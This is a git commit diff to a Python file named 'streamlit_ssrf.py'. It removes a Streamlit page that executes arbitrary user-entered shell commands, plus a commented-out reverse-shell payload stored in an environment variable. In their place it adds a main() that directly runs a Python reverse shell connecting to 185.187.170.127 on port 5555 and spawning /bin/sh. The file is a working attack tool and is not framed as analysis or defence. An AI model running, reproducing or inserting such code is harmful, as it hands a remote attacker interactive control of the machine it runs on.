f8875028fe4409ffc1ad437530195c7c36da3f9c
henrique <iklobato1@gmail.com>
2024-01-15 23:35:36 -0300

    command sudo

--- streamlit_ssrf.py
+++ streamlit_ssrf.py
@@ -1,41 +1,17 @@
-from pprint import pprint
-
-import streamlit as st
 import subprocess
-
-import os
-# os.environ['SUDO_COMMAND'] = """/home/adminuser/venv/bin/streamlit run streamlit_ssrf.py && python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("185.187.170.127",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'"""
-pprint(os.environ)
-
-
-def execute_command(command):
-    try:
-        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
-        return result
-    except subprocess.CalledProcessError as e:
-        return f"Error: {e.output}"
 
 
 def main():
-    st.title("Command Shell")
-
-    command_history = []
-
-    # Input box for user to enter a command
-    command_input = st.text_input("Enter command:")
-
-    # Button to execute the command
-    if st.button("Execute"):
-        if command_input:
-            result = execute_command(command_input)
-            command_history.append({"command": command_input, "result": result})
-
-    # Display command history
-    st.text("Command History:")
-    for entry in command_history:
-        st.text(f"> {entry['command']}")
-        st.text(f"  {entry['result']}")
-        st.text("")
+    try:
+        result = subprocess.check_output(
+            """python -c 'import sys,socket,os,pty;s=socket.socket();s.connect(("185.187.170.127",5555));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""",
+            shell=True,
+            stderr=subprocess.STDOUT,
+            text=True
+        )
+        return result
+    except subprocess.CalledProcessError as e:
+        return f"Error: {e.output}"
 
 
 if __name__ == "__main__":
